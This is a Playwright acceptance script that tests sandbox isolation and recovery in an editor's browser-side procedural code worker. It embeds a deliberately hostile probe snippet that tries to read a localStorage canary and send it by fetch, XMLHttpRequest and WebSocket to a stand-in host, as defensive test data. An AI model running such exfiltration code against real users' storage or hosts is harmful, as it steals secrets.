#!/usr/bin/env node
// Deterministic real-editor check for browser-procedural isolation and recovery.
// All /api/generate responses are fixture NDJSON; no provider/model calls run.
import assert from "node:assert/strict";
import { mkdir, writeFile } from "node:fs/promises";
import { randomBytes } from "node:crypto";
import { chromium, expect } from "@playwright/test";
import { storageSnapshot } from "./lib/browser-storage-snapshot.mjs";

const baseUrl = process.env.TEST_URL ?? "http://localhost:3047";
const output = process.argv[2];
if (!output || process.argv.length !== 3)
  throw Error(
    "Usage: node scripts/verify-browser-procedural-isolation.mjs NEW_EVIDENCE_DIRECTORY",
  );
await mkdir(output, { recursive: false });

const entityId = "isolation-object";
const entityLabel = "Isolation object";
const canaryKey = "__orbsie_procedural_isolation_canary__";
const storageHostPath = "/__orbsie_procedural_isolation_storage_host";
const canary = randomBytes(16).toString("hex");
const baseRecipe = (revision, width) => ({
  version: 1,
  revision,
  output: "body",
  nodes: [{ id: "body", kind: "box", size: [width, 1, 1] }],
});
const sourceFor = (revision, width) => ({
  version: 1,
  language: "quickjs",
  seed: 73,
  code: `({version:1,revision:${revision},output:"body",nodes:[{id:"body",kind:"box",size:[${width},1,1]}]})`,
});
const maliciousSource = {
  version: 1,
  language: "quickjs",
  seed: 73,
  // Probe browser/host surfaces, try reading the canary, and try the common
  // network paths if exposed. Any exposed surface returns a valid tripwire
  // recipe (using the canary as a node ID when readable); otherwise fail.
  // This makes the source fail safely while a breach changes committed state.
  code: `(()=>{const g=globalThis;const names=["window","document","navigator","location","localStorage","sessionStorage","indexedDB","caches","fetch","XMLHttpRequest","WebSocket","Worker","importScripts","process","require","Deno","Bun"];let exposed=false;for(const n of names){try{if(typeof g[n]!=="undefined")exposed=true}catch{exposed=true}}let leak="";try{const s=g.localStorage;if(s)leak=String(s.getItem("${canaryKey}")||"")}catch{exposed=true}try{const s=g.sessionStorage;if(s)leak=leak||String(s.getItem("${canaryKey}")||"")}catch{exposed=true}const target="https://isolation-probe.invalid/"+encodeURIComponent(leak||"probe");try{if(typeof g.fetch==="function")g.fetch(target,{method:"POST",body:leak})}catch{}try{if(typeof g.XMLHttpRequest==="function"){const x=new g.XMLHttpRequest();x.open("POST",target);x.send(leak)}}catch{}try{if(typeof g.WebSocket==="function")new g.WebSocket("wss://isolation-probe.invalid/")}catch{}if(exposed||leak)return {version:1,revision:777,output:leak||"browser_surface",nodes:[{id:leak||"browser_surface",kind:"box",size:[1.7,1,1]}]};throw Error("isolated probe completed")})()`,
};
const loopSource = {
  version: 1,
  language: "quickjs",
  seed: 73,
  code: "(()=>{for(;;){}})()",
};

const report = {
  status: "running",
  scope:
    "Fixture-backed actual editor acceptance for procedural isolation and recovery; no live provider, model call, or full secret audit.",
  fixtureProviderCalls: 0,
  fixtureGenerateRequests: 0,
  externalRequestAttempts: {
    maliciousProbe: 0,
    limitFailure: 0,
    maliciousCanaryUrl: 0,
    maliciousWebSocket: 0,
  },
  pageErrorCount: 0,
  unexpectedGenerationEndpoints: 0,
  checks: {},
  timingsMs: {},
};

const appOrigin = new URL(baseUrl).origin;
let phase = "setup";
let stage = "startup";
let browser;
let context;
let page;

function sourceGeometry(source) {
  return {
    kind: "generated",
    detail: "refined",
    collision: "none",
    job: { backend: "browser-procedural", source },
  };
}

function commandStream(requestNumber) {
  if (requestNumber === 1) {
    return [
      {
        type: "reserve_entity",
        entity: {
          id: entityId,
          label: entityLabel,
          position: [0, 0.5, 0],
          scale: [1, 1, 1],
          color: "#e4c79b",
          stage: "seed",
        },
      },
      {
        type: "set_geometry",
        id: entityId,
        geometry: sourceGeometry(sourceFor(0, 1.3)),
      },
      { type: "commit_revision", message: "Isolation object created." },
    ];
  }
  if (requestNumber === 2) {
    return [
      {
        type: "set_geometry",
        id: entityId,
        geometry: sourceGeometry(maliciousSource),
      },
      { type: "commit_revision", message: "Probe attempted." },
    ];
  }
  if (requestNumber === 3) {
    return [
      {
        type: "set_geometry",
        id: entityId,
        geometry: sourceGeometry(loopSource),
      },
      { type: "commit_revision", message: "Bounded failure attempted." },
    ];
  }
  if (requestNumber === 4) {
    return [
      {
        type: "set_geometry",
        id: entityId,
        geometry: sourceGeometry(sourceFor(1, 1.8)),
      },
      { type: "commit_revision", message: "Isolation object recovered." },
    ];
  }
  throw Error("Unexpected fixture generation request.");
}

async function savedProject() {
  return (await storageSnapshot(page)).project;
}

async function waitForRecipeRevision(revision) {
  let project;
  await expect
    .poll(
      async () => {
        project = await savedProject();
        return project?.entities.find((entity) => entity.id === entityId)
          ?.geometry?.job?.recipe?.revision;
      },
      { timeout: 45_000 },
    )
    .toBe(revision);
  return project;
}

async function changeObject(prompt) {
  await page.locator("#prompt").fill(prompt);
  await page.getByRole("button", { name: "Change this", exact: true }).click();
}

async function dismissErrorToast() {
  const toast = page.locator(".toast.error");
  if (await toast.isVisible().catch(() => false))
    await toast.getByRole("button", { name: "Dismiss message" }).click();
}

async function assertNoErrorToast() {
  await expect(page.locator(".toast.error")).toBeHidden();
}

async function waitForFixtureRequest(requestNumber) {
  await expect
    .poll(() => report.fixtureGenerateRequests, { timeout: 10_000 })
    .toBe(requestNumber);
}

try {
  stage = "browser launch";
  browser = await chromium.launch({
    headless: true,
    args: [
      "--no-sandbox",
      "--use-gl=angle",
      "--use-angle=swiftshader",
      "--enable-unsafe-swiftshader",
    ],
  });
  context = await browser.newContext({
    viewport: { width: 1280, height: 900 },
    reducedMotion: "reduce",
    serviceWorkers: "block",
  });
  await context.addInitScript(() => {
    const NativeWorker = window.Worker;
    window.__proceduralWorkerStarts = 0;
    window.__proceduralWorkersActive = 0;
    window.__proceduralWorkerTerminations = 0;
    window.Worker = class extends NativeWorker {
      constructor(...args) {
        super(...args);
        if (String(args[0]).includes("procedural-worker.js")) {
          window.__proceduralWorkerStarts += 1;
          window.__proceduralWorkersActive += 1;
          this.__orbsieProceduralTracked = true;
        }
      }

      terminate() {
        if (this.__orbsieProceduralTracked) {
          this.__orbsieProceduralTracked = false;
          window.__proceduralWorkersActive -= 1;
          window.__proceduralWorkerTerminations += 1;
        }
        return super.terminate();
      }
    };
  });
  await context.route("**/*", async (route) => {
    const target = new URL(route.request().url());
    if (target.origin !== appOrigin) {
      if (phase === "maliciousProbe") {
        report.externalRequestAttempts.maliciousProbe += 1;
        if (target.href.includes(canary))
          report.externalRequestAttempts.maliciousCanaryUrl += 1;
      } else if (phase === "limitFailure") {
        report.externalRequestAttempts.limitFailure += 1;
      }
      // Fonts are not needed for this behavior check; fulfill locally so the
      // editor does not depend on a third-party service.
      if (target.origin === "https://fonts.googleapis.com")
        return route.fulfill({ contentType: "text/css", body: "" });
      return route.abort();
    }
    if (target.pathname === storageHostPath)
      return route.fulfill({
        contentType: "text/html",
        body: "<!doctype html><html><body></body></html>",
      });
    if (target.pathname === "/api/trial")
      return route.fulfill({
        json: { enabled: true, remaining: 3, limit: 3 },
      });
    if (
      target.pathname === "/api/generate" &&
      route.request().method() === "POST"
    ) {
      report.fixtureGenerateRequests += 1;
      const request = route.request().postDataJSON();
      assert.equal(request.localModeling, false);
      assert.equal(request.browserModeling, true);
      const commands = commandStream(report.fixtureGenerateRequests);
      return route.fulfill({
        status: 200,
        contentType: "application/x-ndjson",
        headers: { "Cache-Control": "no-store" },
        body:
          commands.map((command) => JSON.stringify(command)).join("\n") + "\n",
      });
    }
    if (/^\/api\/(?:chatgpt\/)?generate(?:\/|$)/.test(target.pathname)) {
      report.unexpectedGenerationEndpoints += 1;
      return route.abort();
    }
    return route.fallback();
  });
  await context.routeWebSocket("**/*", (socket) => {
    const target = new URL(socket.url());
    if (target.origin !== appOrigin) {
      if (phase === "maliciousProbe") {
        report.externalRequestAttempts.maliciousProbe += 1;
        report.externalRequestAttempts.maliciousWebSocket += 1;
      } else if (phase === "limitFailure") {
        report.externalRequestAttempts.limitFailure += 1;
      }
      socket.close();
      return;
    }
    socket.connect();
  });

  stage = "page creation";
  page = await context.newPage();
  page.setDefaultTimeout(30_000);
  page.setDefaultNavigationTimeout(30_000);
  page.on("pageerror", () => {
    report.pageErrorCount += 1;
  });
  const entry = new URL(baseUrl);
  entry.hash = `builder=${encodeURIComponent(
    JSON.stringify({ url: "http://127.0.0.1:9999", token: "a".repeat(43) }),
  )}`;
  stage = "application navigation";
  await page.goto(entry.href);
  stage = "initial composer";
  await page
    .getByPlaceholder("What experience to build?")
    .fill("Build an isolation object");

  stage = "initial procedural object";
  await page.getByRole("button", { name: "Create", exact: true }).click();
  const initialProject = await waitForRecipeRevision(0);
  stage = "editor canvas after object creation";
  await expect(page.locator("canvas")).toBeVisible();
  const initialEntity = initialProject.entities.find(
    (entity) => entity.id === entityId,
  );
  assert.ok(initialEntity);
  assert.equal(initialEntity.stage, "ready");
  assert.equal(initialEntity.geometry.model.source, "browser-manifold");
  assert.equal(initialEntity.geometry.job.backend, "browser-manifold");
  assert.equal(initialEntity.geometry.job.authoring.source.language, "quickjs");
  assert.equal(initialEntity.geometry.job.authoring.source.seed, 73);
  assert.equal(initialEntity.geometry.job.recipe.revision, 0);
  assert.ok((await page.evaluate(() => window.__proceduralWorkerStarts)) > 0);
  report.checks.validBrowserProceduralObject = true;
  report.checks.initialWorkerEvaluation = true;
  await page.waitForTimeout(1_500);

  stage = "synthetic canary seeding after editor storage initialization";
  const storageHost = await context.newPage();
  const storageHostUrl = new URL(storageHostPath, appOrigin);
  await storageHost.goto(storageHostUrl.href);
  const seeded = await storageHost.evaluate(
    ({ key, value }) => {
      localStorage.setItem(key, value);
      return localStorage.getItem(key) === value;
    },
    { key: canaryKey, value: canary },
  );
  await storageHost.close();
  assert.equal(
    seeded,
    true,
    "The synthetic localStorage canary was not seeded.",
  );
  report.checks.syntheticCanarySeededInEditorStorage = true;

  stage = "open object list";
  const objectList = page.locator(".object-list");
  if (!(await objectList.isVisible().catch(() => false))) {
    const showObjects = page.getByRole("button", {
      name: "Show objects",
      exact: true,
    });
    await expect(showObjects).toBeVisible();
    await showObjects.click();
  }
  await expect(objectList).toBeVisible();
  stage = "select procedural object";
  const selectObject = objectList.getByRole("button", {
    name: entityLabel,
  });
  assert.equal(
    await selectObject.count(),
    1,
    "Expected one matching object row.",
  );
  await expect(selectObject).toBeVisible();
  await selectObject.click();

  stage = "malicious procedural probe";
  await assertNoErrorToast();
  const workersBeforeProbe = await page.evaluate(
    () => window.__proceduralWorkerStarts,
  );
  phase = "maliciousProbe";
  await changeObject("Probe procedural isolation");
  await waitForFixtureRequest(2);
  await expect(page.locator(".toast.error")).toBeVisible({ timeout: 45_000 });
  await page.waitForTimeout(250);
  const afterProbe = await savedProject();
  const afterProbeEntity = afterProbe.entities.find(
    (entity) => entity.id === entityId,
  );
  assert.equal(afterProbe.revision, initialProject.revision);
  assert.equal(
    JSON.stringify(afterProbeEntity) === JSON.stringify(initialEntity),
    true,
    "The malicious source changed the saved entity.",
  );
  assert.ok(
    (await page.evaluate(() => window.__proceduralWorkerStarts)) >
      workersBeforeProbe,
    "The malicious source did not reach the procedural worker.",
  );
  assert.equal(JSON.stringify(afterProbe).includes(canary), false);
  assert.equal(
    report.externalRequestAttempts.maliciousProbe,
    0,
    "The malicious procedural probe attempted an external request.",
  );
  assert.equal(report.externalRequestAttempts.maliciousCanaryUrl, 0);
  assert.equal(report.externalRequestAttempts.maliciousWebSocket, 0);
  report.checks.maliciousSourceReachedWorker = true;
  report.checks.hostStorageCanaryNotCommitted = true;
  report.checks.exactSceneAndSourcePreservedAfterProbe = true;
  report.checks.noExternalRequestDuringProbe = true;
  phase = "idle";
  await dismissErrorToast();
  await assertNoErrorToast();

  stage = "bounded infinite-loop failure";
  await assertNoErrorToast();
  const beforeLimit = await savedProject();
  const beforeLimitEntity = beforeLimit.entities.find(
    (entity) => entity.id === entityId,
  );
  const workerStateBeforeLimit = await page.evaluate(() => ({
    starts: window.__proceduralWorkerStarts,
    terminations: window.__proceduralWorkerTerminations,
  }));
  phase = "limitFailure";
  const limitStartedAt = performance.now();
  await changeObject("Run bounded procedural loop");
  await waitForFixtureRequest(3);
  await expect(page.locator(".toast.error")).toBeVisible({ timeout: 25_000 });
  report.timingsMs.loopFailure = Math.round(performance.now() - limitStartedAt);
  const afterLimit = await savedProject();
  const afterLimitEntity = afterLimit.entities.find(
    (entity) => entity.id === entityId,
  );
  assert.equal(afterLimit.revision, beforeLimit.revision);
  assert.equal(
    JSON.stringify(afterLimitEntity) === JSON.stringify(beforeLimitEntity),
    true,
    "The limit failure changed the saved entity.",
  );
  assert.equal(report.externalRequestAttempts.limitFailure, 0);
  assert.equal(JSON.stringify(afterLimit).includes(canary), false);
  const workerStateAfterLimit = await page.evaluate(() => ({
    starts: window.__proceduralWorkerStarts,
    active: window.__proceduralWorkersActive,
    terminations: window.__proceduralWorkerTerminations,
  }));
  assert.ok(workerStateAfterLimit.starts > workerStateBeforeLimit.starts);
  assert.ok(
    workerStateAfterLimit.terminations > workerStateBeforeLimit.terminations,
    "The infinite-loop worker was not terminated after its bounded failure.",
  );
  assert.equal(
    workerStateAfterLimit.active,
    0,
    "The infinite-loop worker remained active before recovery.",
  );
  report.checks.infiniteLoopBoundedFailure = true;
  report.checks.limitWorkerTerminatedBeforeRecovery = true;
  report.checks.exactSceneAndSourcePreservedAfterLimit = true;
  report.checks.noExternalRequestDuringLimitFailure = true;
  phase = "idle";
  await dismissErrorToast();
  await assertNoErrorToast();

  stage = "valid recovery edit";
  await assertNoErrorToast();
  await changeObject("Recover with a valid procedural edit");
  await waitForFixtureRequest(4);
  const recoveredProject = await waitForRecipeRevision(1);
  const recoveredEntity = recoveredProject.entities.find(
    (entity) => entity.id === entityId,
  );
  assert.ok(recoveredEntity);
  assert.equal(recoveredEntity.id, initialEntity.id);
  assert.equal(recoveredEntity.geometry.job.recipe.revision, 1);
  assert.deepEqual(
    recoveredEntity.geometry.job.recipe.nodes,
    baseRecipe(1, 1.8).nodes,
  );
  assert.notEqual(
    recoveredEntity.geometry.job.authoring.source.code,
    initialEntity.geometry.job.authoring.source.code,
  );
  report.checks.validTargetedRecoveryEdit = true;

  stage = "reload recovery";
  const recoveredCopy = JSON.parse(JSON.stringify(recoveredEntity));
  await page.reload();
  await expect(
    page.getByRole("button", { name: "Continue your saved world" }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Continue your saved world" }).click();
  await expect(
    page.getByRole("button", { name: "Show objects", exact: true }),
  ).toBeVisible();
  const reloadedProject = await savedProject();
  const reloadedEntity = reloadedProject.entities.find(
    (entity) => entity.id === entityId,
  );
  assert.equal(reloadedProject.revision, recoveredProject.revision);
  assert.equal(
    JSON.stringify(reloadedEntity) === JSON.stringify(recoveredCopy),
    true,
    "Reload did not restore the recovered entity exactly.",
  );
  assert.equal(await page.evaluate(() => window.__proceduralWorkerStarts), 0);
  assert.equal(JSON.stringify(reloadedProject).includes(canary), false);
  report.checks.reloadPreservesStableEntityIdAndSource = true;
  report.checks.reloadUsesCachedGeometry = true;

  stage = "browser context cleanup";
  report.checks.syntheticCanaryScopedToEphemeralContext = true;
  assert.equal(report.unexpectedGenerationEndpoints, 0);
  report.status = "passed";
} catch (error) {
  report.status = "failed";
  report.diagnosticOnly = true;
  report.failureStage = stage;
  report.failureType = error instanceof Error ? error.name : "unknown";
  await page
    ?.screenshot({ path: `${output}/diagnostic-failure.png` })
    .catch(() => undefined);
} finally {
  phase = "cleanup";
  report.externalRequestAttempts.total =
    report.externalRequestAttempts.maliciousProbe +
    report.externalRequestAttempts.limitFailure;
  const serialized = JSON.stringify(report, null, 2) + "\n";
  assert.equal(
    serialized.includes(canary),
    false,
    "Evidence report is not redacted.",
  );
  await writeFile(`${output}/report.json`, serialized, { mode: 0o600 });
  await context?.close().catch(() => undefined);
  await browser?.close().catch(() => undefined);
}

if (report.status !== "passed")
  throw Error(
    `Browser procedural isolation acceptance failed at ${report.failureStage}.`,
  );
process.stdout.write(`${JSON.stringify(report, null, 2)}\n`);
